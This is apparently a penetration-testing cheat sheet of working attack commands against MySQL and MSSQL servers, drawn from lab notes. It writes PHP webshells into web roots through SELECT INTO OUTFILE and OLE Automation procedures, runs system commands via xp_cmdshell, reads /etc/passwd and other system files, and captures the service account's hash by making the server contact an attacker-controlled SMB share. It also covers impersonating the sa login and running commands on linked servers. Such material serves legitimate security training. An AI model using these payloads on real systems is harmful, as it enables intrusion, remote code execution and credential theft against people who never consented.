## Enumeration

Refer to Service enumeration.

## Protocol Specific Attacks

### Read/Change Database

MySQL
```bash
## MySQl - Connect to server
mysql -u julio -pPassword123 -h 10.129.20.13

## Sqlcmd - Connect to server
sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```

MSSQL
```bash
## sqsh - Connect to server
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

## When using Windows Authentication, we need to specify the domain name or the hostname of the target machine
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

## Mssql client - Connect to server
mssqlclient.py -p 1433 julio@10.129.203.7 

mssqlclient.py -p 1433 julio@10.129.203.7 -windows-auth
```

### SQL Default Databases

MySQL default system schemas/databases:

- __mysql__ - is the system database that contains tables that store information required by the MySQL server
- __information_schema__ - provides access to database metadata
- __performance_schema__ - is a feature for monitoring MySQL Server execution at a low level
- __sys__ - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

MSSQL default system schemas/databases:

- __master__ - keeps the information for an instance of SQL Server.
- __msdb__ - used by SQL Server Agent.
- __model__ - a template database copied for each new database.
- __resource__ - a read-only database that keeps system objects visible in every database on the server in sys schema.
- __tempdb__ - keeps temporary objects for SQL queries.

### Execute Commands

MSSQL has a extended stored procedures called xp_cmdshell which allow us to execute system commands using SQL. 

```bash
## Sample command
xp_cmdshell 'whoami'
```

### MySQL Attacks

```bash
## Write local file
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';    # Given MySQL operates on PHP-based srv

## Secure file privilege - Read on the diff possible settings
show variables like "secure_file_priv";

## Read local file
select LOAD_FILE("/etc/passwd");
```

### MSSQL Attacks

To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file.

```bash
## Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
sp_configure 'Ole Automation Procedures', 1
```

```bash
## Create file
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```

```bash
## Read local files
SELECT * FROM OPENROWSET(BULK ''C:/Windows/System32/drivers/etc/hosts'', SINGLE_CLOB) AS Contents
```

```bash
## Capture MSSQL Service Hash
## To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries
EXEC master..xp_dirtree '\\10.10.110.17\share\'
EXEC master..xp_subdirs '\\10.10.110.17\share\'
```

```bash
## Identify users that we can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'

## Verify current user and role
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

## Impersonate SA user
## Recommended to run EXECUTE AS LOGIN within the master DB
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

```bash
## Communicate with other databases
SELECT srvname, isremote FROM sysservers

## Send pass-through commands to linked servers (0)
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
```

